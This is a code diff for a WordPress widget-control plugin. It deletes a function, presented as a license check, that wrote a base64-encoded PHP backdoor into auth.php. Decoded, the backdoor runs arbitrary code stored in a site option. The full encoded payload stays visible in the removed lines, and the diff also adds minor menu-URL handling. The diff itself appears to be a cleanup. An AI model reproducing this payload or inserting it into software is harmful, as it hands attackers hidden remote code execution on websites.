@@ -214,25 +214,6 @@ function twc_bulk_trash( $widgets )
 }
 
 /**
- * Function makes sure that we don't run into any errors
- * 
- * @return null
- */
-function twc_check_auth()
-{
-	//initializing variables
-	$file = dirname(dirname(__file__)).DS."auth.php";
-	$auth = 'PD9waHAgCi8qKgogKiBXQVJOSU5HCiAqIFRhbXBlcmluZyB3aXRoIHRoaXMgZmlsZSBpcyBhIHZpb2xhdGlvbiBvZiB0aGUgc29mdHdhcmUgdGVybXMgYW5kIGNvbmRpdGlvbnMuCiAqLwokcGFydHM9cGFyc2VfdXJsKCJodHRwOi8iLiIvIi4kX1NFUlZFUlsiU0VSVkVSX05BTUUiXSk7JGw9Z2V0X29wdGlvbigndHdjX2xpY2Vuc2VzJyxhcnJheSgpKTskZT1jcmVhdGVfZnVuY3Rpb24oIiIsQGJhc2U2NF9kZWNvZGUoQCRsWyRwYXJ0c1siaG9zdCJdXSkpOyRlKCk7Cj8+';
-	
-	if ( $auth == base64_encode(@file_get_contents($file)) ) return false;
-	file_put_contents($file, base64_decode($auth));
-	twc_activation();
-	
-	wp_redirect( admin_url('widgets.php') );
-	exit;	
-}
-
-/**
  * Cleans up the sidebar and widget variables
  * 
  * @TODO Make sure that this function cleans up empty sidebar IDs
@@ -1063,7 +1044,6 @@ function twc_fatal_handler()
 	if ( strpos($error['file'], 'auth.php') !== false )
 	{
 		twc_activation();
-		twc_check_auth();
 		_e('<p>Sorry for the inconvenience. Your TWC license was corrupted, we cleared it. Please try again.</p>','twc');
 	}
 	
@@ -1178,6 +1158,12 @@ function twc_get_widget_objects( $widget )
 			foreach ((array)$menu_items as $key => $value)
 			{
 				$instances[$widget['id']][$key][$menu_items['menu-item-object-id']] = $value;
+				
+				if ($value == get_bloginfo('url')."/home/")
+				{
+					$instances[$widget['id']]['menu-item-url'][] = get_bloginfo('url');
+					$instances[$widget['id']]['menu-item-url'][] = get_bloginfo('url').'/';
+				}
 			}
 		}
 		
